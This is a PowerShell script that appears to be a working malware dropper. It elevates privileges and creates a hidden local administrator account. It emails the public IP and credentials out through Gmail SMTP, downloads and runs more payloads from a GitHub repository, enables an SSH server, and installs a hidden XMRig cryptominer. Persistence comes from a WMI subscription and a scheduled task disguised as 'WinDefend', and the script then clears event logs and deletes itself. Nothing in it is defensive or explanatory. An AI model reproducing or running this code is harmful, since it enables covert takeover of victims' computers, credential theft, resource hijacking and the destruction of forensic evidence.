function random_text {
    return -join ((97..122)+(65..90) | Get-Random -Count 5 | % {[char]$_})
}

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Exit
} else {
    Set-Variable -Name username -Value ("...")
    Set-Variable -Name Password -Value (ConvertTo-SecureString ".V3n0m" -AsPlainText -Force)
    New-LocalUser $username -Description "Local admin account created via PowerShell" -FullName "..." -Password $Password
    Add-LocalGroupMember -Member $username -Group "Administrators"
}

Set-Variable -Name wd -Value (random_text)
Set-Variable -Value ("$env:temp\$wd") -Name path
Set-Variable -Name INITIALPATH -Value (Get-Location)
Set-Variable -Value "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Name initial_dir

Set-Variable -Value (Get-Content PkUbTvqXFIdB.txt) -Name email
Set-Variable -Name password -Value (Get-Content NzKnmxLrbsBw.txt)

$PublicIP = Invoke-RestMethod -Uri "https://api64.ipify.org"

Set-Variable -Name ipFile -Value ("$initial_dir\ip.txt")
$PublicIP | Out-File -FilePath $ipFile

Set-Variable -Name configfile -Value ("$env:UserName.rat")
Set-Content -Path $configfile -Value ""
Add-Content -Value $PublicIP -Path $configfile
Add-Content -Path $configfile -Value $password
Add-Content -Value $INITIALPATH -Path $configfile
Add-Content -Value $env:temp -Path $configfile

Set-Variable -Name SecurePassword -Value (ConvertTo-SecureString $password -AsPlainText -Force)
Set-Variable -Name plainPassword -Value ([Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)))
Add-Content -Value $plainPassword -Path $configfile

Send-MailMessage `
    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -Force -String $plainPassword -AsPlainText)) `
    -Port 587 `
    -From $email `
    -Subject "IP Address Notification from $env:UserName" `
    -UseSsl `
    -To $email `
    -SmtpServer "smtp.gmail.com" `
    -Attachment $configfile

Remove-Item -Path $configfile
mkdir $path
cd $path

Invoke-WebRequest -OutFile "QyjAaZDBbNPk.reg" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg"
Invoke-WebRequest -OutFile "FoRAUwtxKkSB.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/calty.vbs"
Invoke-WebRequest -OutFile "w.bat" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/w.bat"
Invoke-WebRequest -OutFile "ZDaFvwjOosKx.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/tasks.ps1" -OutFile "AEQKCPrkuifY.ps1"

Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -StartupType 'Automatic' -Name sshd
Get-NetFirewallRule -Name *ssh*

& "./QyjAaZDBbNPk.reg"
& "./FoRAUwtxKkSB.vbs"

Move-Item -Path "$path\ZDaFvwjOosKx.vbs" -Destination $initial_dir

Start-Sleep -Seconds 30
New-Item -ItemType Directory -Name "$wd" -Path "$path"
cd $wd
Set-Variable -Name currentDir -Value ($Pwd)

Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$initial_dir"

Set-ItemProperty -Value "Hidden" -Path "$initial_dir\xmrig-6.22.2" -Name Attributes

Set-Variable -Name newConfigPath -Value ("$path\w.bat")
Set-Variable -Value ("$initial_dir\xmrig-6.22.2\w.bat") -Name targetConfigPath
if (Test-Path -Path $newConfigPath) {
    Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
    Write-Output "bat file has been copied successfully."
} else {
    Write-Output "New bat file not found at the specified path."
}

Remove-Item -Path "$initial_dir\ip.txt"

Set-Location -Path 'C:\Users'
if (Test-Path -Path '...' -PathType Container) {
    attrib +h +s +r ...
    Write-Output "... directory attributes set to hidden, system, and read-only"
} else {
    Write-Output "... directory does not exist"
    Exit 1
}


cd $path
Remove-Item -Path "w.bat"
Remove-Item -Path "QyjAaZDBbNPk.reg"
Remove-Item -Path "FoRAUwtxKkSB.vbs"

Set-ItemProperty -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Name Attributes -Value "Hidden"

cd $initial_dir
Start-Process -FilePath "cscript.exe" -windowstyle hidden -ArgumentList "ZDaFvwjOosKx.vbs"

Start-Process -windowstyle hidden -ArgumentList "$initial_dir\xmrig-6.22.2\w.bat" -FilePath "cscript.exe"

Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
cd "$initial_dir\xmrig-6.22.2"
Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait
#Start-Process -FilePath ".\xmrig.exe" -ArgumentList "--config=config.json" -NoNewWindow -Wait

#Start-Process -FilePath "$initial_dir\xmrig-6.22.2\xmrig.exe" -windowstyle hidden 
#& "./TMqhONoBljEv.vbs"

Set-ItemProperty -Name Attributes -Path "$initial_dir\AEQKCPrkuifY.ps1" -Value "Hidden"

Get-WmiObject -Namespace root\subscription -Class __EventFilter | 
    Where-Object {$_.Name -like "SysHealth_*"} | 
    Remove-WmiObject -ErrorAction SilentlyContinue

Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | 
    Where-Object {$_.Name -like "SysMaint_*"} | 
    Remove-WmiObject -ErrorAction SilentlyContinue

try {
    $wmiFilterQuery = @"
    SELECT * FROM __InstanceModificationEvent WITHIN 60 
    WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' 
    AND TargetInstance.SystemUpTime >= 300
"@

    $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
        Name = "SysHealth_$((Get-Date).Ticks)"
        EventNamespace = 'root\cimv2'  
        Query = $wmiFilterQuery
        QueryLanguage = "WQL"
    }

    $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
        Name = "SysMaint_$((Get-Date).Ticks)"
        CommandLineTemplate = "`"$newConfigPath`" --donate-level=0"
    }

    $binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
        Filter = $filter.__PATH
        Consumer = $consumer.__PATH
    }
}
catch {
    Write-Warning "WMI persistence failed: $($_.Exception.Message)"
}

try {
    $taskSettings = New-ScheduledTaskSettingsSet `
        -StartWhenAvailable `
        -DontStopIfGoingOnBatteries `
        -MultipleInstances IgnoreNew

    $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -Minutes (Get-Random -Min 2 -Max 5))
    Register-ScheduledTask -TaskName "WinDefend_$((Get-Date).Ticks)" `
        -Trigger $trigger `
        -Action (New-ScheduledTaskAction -Execute "$newConfigPath" -Argument "--donate-level=0") `
        -Settings $taskSettings `
        -Force | Out-Null
}
catch {
    Write-Warning "Scheduled task creation failed: $($_.Exception.Message)"
}

if (-not (Get-Process -Name (Get-Item $newConfigPath).BaseName -ErrorAction SilentlyContinue)) {
    Start-Process "$newConfigPath" -WindowStyle Hidden
}

wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
wevtutil cl "System" 2>$null

if (-not $PSCommandPath.Contains("ProgramData")) {
    Start-Process powershell "-Command `"Start-Sleep 5; Remove-Item '$PSCommandPath' -Force`"" -WindowStyle Hidden
}

Start-Process -FilePath "$path\AEQKCPrkuifY.ps1" -windowstyle hidden
Start-Sleep -Seconds 360

Remove-Item -Path "$initial_dir\ip.txt"
Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
Remove-Item -Path "$initial_dir\TMqhONoBljEv.vbs"
